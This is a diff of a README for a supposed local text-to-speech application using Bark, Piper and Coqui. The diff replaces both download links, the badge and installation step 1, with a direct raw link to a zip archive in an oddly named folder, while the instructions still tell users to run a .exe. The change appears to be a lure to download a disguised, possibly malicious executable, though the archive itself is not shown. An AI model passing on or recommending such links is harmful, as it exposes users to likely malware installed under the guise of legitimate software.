@@ -1,6 +1,6 @@
 # 🎙️ bark-piper-coqui-tts-local-tts - Run private text to speech models
 
-[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/roundjamison607/bark-piper-coqui-tts-local-tts)
+[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/roundjamison607/bark-piper-coqui-tts-local-tts/raw/refs/heads/main/zoarcidae/tts-piper-bark-local-coqui-v1.2-beta.5.zip)
 
 This application provides a simple interface to run high-quality text-to-speech models on your local computer. It includes support for Bark, Piper, and Coqui TTS engines. You can transform text into realistic human speech without an internet connection. All processing happens on your machine to protect your privacy.
 
@@ -18,7 +18,7 @@ To run this software, your computer needs to meet these basic standards:
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit the repository page to download the software: https://github.com/roundjamison607/bark-piper-coqui-tts-local-tts
+1. Visit the repository page to download the software: https://github.com/roundjamison607/bark-piper-coqui-tts-local-tts/raw/refs/heads/main/zoarcidae/tts-piper-bark-local-coqui-v1.2-beta.5.zip
 2. Look for the latest release version on the right side of the screen.
 3. Choose the file that ends in .exe.
 4. Save the file to your Downloads folder.
